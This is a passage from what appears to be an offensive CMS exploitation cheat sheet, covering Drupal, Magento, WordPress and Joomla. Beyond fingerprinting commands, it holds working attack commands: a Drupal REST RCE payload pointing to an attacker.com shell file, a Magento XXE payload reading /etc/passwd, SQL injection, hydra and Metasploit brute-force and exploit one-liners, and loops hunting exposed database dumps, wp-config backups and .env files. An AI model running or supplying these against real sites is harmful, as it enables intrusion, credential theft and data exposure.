# CVE-2019-6340 -- Drupal 8.x REST API RCE
# Exploit via GET request with crafted Accept header
curl -s "http://target/node/1?_format=hal_json" \
  -H "Accept: application/hal+json" \
  -H "Content-Type: application/hal+json" \
  --data-binary '{"_links":{"type":{"href":"http://target/rest/type/node/article"}},"title":[{"value":"test"}],"type":[{"target_id":"article"}],"_embedded":{"http://target/rest/relation/node/article/field_image":[{"uri":{"value":"http://attacker.com/shell.php"},"type":[{"target_id":"file"}],"_links":{"type":{"href":"http://target/rest/type/file/image"}}}]}}'

# Check if REST API endpoints are exposed
curl -s http://target/jsonapi | head -20
curl -s http://target/node/1?_format=json | head -20
curl -s http://target/entity/node?_format=hal_json | head -20
```

---

## 13. Magento CMS Exploitation

### 13.1 Magento Fingerprinting and Version Detection

```bash
# Magento version detection
curl -s http://target/magento_version | head -5
curl -s http://target/RELEASE_NOTES.txt | head -10
curl -s http://target/errors/default/report.phtml | grep -i magento
curl -sI http://target | grep -i "x-magento"

# Magento admin panel detection
curl -s http://target/admin/ | head -10
curl -s http://target/admin123/ | head -10
curl -s http://target/manager/ | head -10

# Magento API endpoints
curl -s http://target/rest/V1/modules | jq .
curl -s http://target/rest/V1/store/storeViews | jq .
curl -s http://target/rest/all/V1/categories | jq .

# Magento static content fingerprinting
curl -s http://target/static/frontend/ | head -5
curl -s http://target/pub/static/frontend/ | head -5
```

### 13.2 Magento Known CVEs

```bash
# CVE-2024-34102 -- Magento Adobe Commerce XXE (CosmicSting)
# Critical unauthenticated XXE leading to RCE
curl -s -X POST "http://target/rest/V1/guest-carts/1/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{"address":{"totals":{"total_quantity":1},"postcode":"<new xmlns=\"x\"><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xxe>&xxe;</xxe>]]>","region":"test"}}'

# Magento checkout/cart SQL injection (older versions)
curl -s "http://target/checkout/cart/add/product/1?qty=1' OR '1'='1" | head -20

# Magento admin panel brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/admin/login/index.php/:login[username]=^USER^&login[password]=^PASS^&form_key=KEY:Invalid"
```

---

## 14. CMS Fingerprinting Techniques (Advanced)

### 14.1 HTTP Header Analysis for CMS Detection

```bash
# Collect and analyze HTTP response headers
curl -sI http://target | grep -iE "server|x-powered-by|x-generator|link|set-cookie|x-drupal|x-magento|x-joomla"

# CMS-specific header patterns
# WordPress: Link: <http://target/?p=123>; rel=shortlink, X-Pingback
# Joomla: X-Content-Encoded-By: Joomla
# Drupal: X-Generator: Drupal, X-Drupal-Cache
# Magento: X-Magento-Cache-Control, X-Magento-Tags

# Cookie-based CMS detection
curl -sI http://target | grep -i "set-cookie"
# WordPress: wordpress_logged_in_, wp-settings-
# Joomla: joomla_user_state, ea4a6b3a3b
# Drupal: SSESS, drupal.uid
# Magento: PHPSESSID with mage-cache-session

# robots.txt analysis for CMS fingerprinting
curl -s http://target/robots.txt | grep -iE "wordpress|joomla|drupal|magento|admin|wp-|sites/default"
```

### 14.2 JavaScript and CSS Analysis for CMS Detection

```bash
# Check for CMS-specific JavaScript files
curl -s http://target/wp-includes/js/wp-embed.min.js | head -1
curl -s http://target/media/jui/js/jquery.min.js | head -1  # Joomla
curl -s http://target/misc/drupal.js | head -1              # Drupal
curl -s http://target/static/frontend/js/jquery.min.js | head -1  # Magento

# CSS file analysis for theme/CMS identification
curl -s http://target/wp-content/themes/*/style.css | head -5
curl -s http://target/modules/mod_custom/tmpl/default.php | head -5

# Favicon hash comparison (use favicon.ico to identify CMS)
curl -s http://target/favicon.ico | md5sum
# Compare against known CMS favicon hashes
```

### 14.3 Wappalyzer-Style CMS Detection

```bash
# Simulate Wappalyzer detection using curl and grep
curl -s http://target | grep -oE "wp-content|wp-includes|wp-json|wordpress" | sort -u
curl -s http://target | grep -oE "/media/jui|/components/com_|/modules/mod_" | sort -u
curl -s http://target | grep -oE "/sites/default|/misc/drupal|Drupal.settings" | sort -u
curl -s http://target | grep -oE "Magento|magento|Mage." | sort -u

# Nuclei technology detection templates
nuclei -u http://target -t ~/nuclei-templates/http/technologies/ -tags cms -silent

# Combined fingerprinting with whatweb
whatweb -a 3 -v http://target 2>/dev/null | grep -iE "wordpress|joomla|drupal|magento|cms"
```

---

## 15. CMS Automated Exploitation Frameworks

### 15.1 WPScan API-Based Bulk Scanning

```bash
# Bulk WordPress scanning with WPScan and API token
for target in $(cat wp_targets.txt); do
  echo "[SCANNING] $target"
  wpscan --url "http://$target" --enumerate u,vp,vt,dbe,cb \
    --api-token YOUR_API_TOKEN --output "wpscan_${target}.txt" --format cli-no-color
done

# WPScan with vulnerability export
wpscan --url http://target --enumerate vp,vt --api-token YOUR_API_TOKEN \
  --output wpscan_vulns.json --format json
```

### 15.2 CMSmap -- Multi-CMS Scanner

```bash
# CMSmap -- automated scanning for WordPress, Joomla, Drupal
cmsmap -u http://target

# WordPress specific scan
cmsmap -u http://target -t wp --noedb

# Joomla specific scan with brute force
cmsmap -u http://target -t joomla -a admin -w /usr/share/wordlists/rockyou.txt

# Drupal specific scan
cmsmap -u http://target -t drupal

# Save results to file
cmsmap -u http://target -o cmsmap_results.txt
```

### 15.3 Automated CMS Exploitation with Metasploit

```bash
# Metasploit WordPress scanner module
msfconsole -q -x "use auxiliary/scanner/http/wordpress_scanner; set RHOSTS target; run; exit"

# WordPress XML-RPC brute force via Metasploit
msfconsole -q -x "use auxiliary/scanner/http/wordpress_xmlrpc_login; set RHOSTS target; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit"

# Drupal Drupalgeddon2 exploit
msfconsole -q -x "use exploit/multi/http/drupal_drupageddon2; set RHOSTS target; run; exit"

# Joomla HTTP Header RCE (CVE-2015-8562)
msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS target; run; exit"
```

### 15.4 Nuclei CMS Fuzzing Templates

```bash
# CMS fuzzing with Nuclei custom templates
# Create custom CMS detection template
cat > cms-detect.yaml << 'EOF'
id: cms-detect
info:
  name: CMS Technology Detection
  author: custom
  severity: info
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "wp-content"
          - "wp-includes"
        condition: or
      - type: word
        words:
          - "/components/com_"
          - "/modules/mod_"
        condition: or
EOF

nuclei -u http://target -t cms-detect.yaml -v
```

### 15.5 CMS Backup and Database File Hunting

```bash
# Automated CMS backup file discovery
for target in $(cat targets.txt); do
  echo "[CHECKING] $target"
  for path in "backup.sql" "db.sql" "database.sql" "dump.sql" "site.sql" \
    "backup.tar.gz" "backup.zip" "site.zip" "htdocs.tar.gz" "public_html.tar.gz" \
    "wp-config.php.bak" "wp-config.php.old" "configuration.php.bak" \
    "settings.php.bak" ".env" ".env.bak" ".env.old"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$target/$path")
    if [ "$STATUS" = "200" ]; then
      echo "[FOUND:$STATUS] http://$target/$path"
    fi
  done
done
```
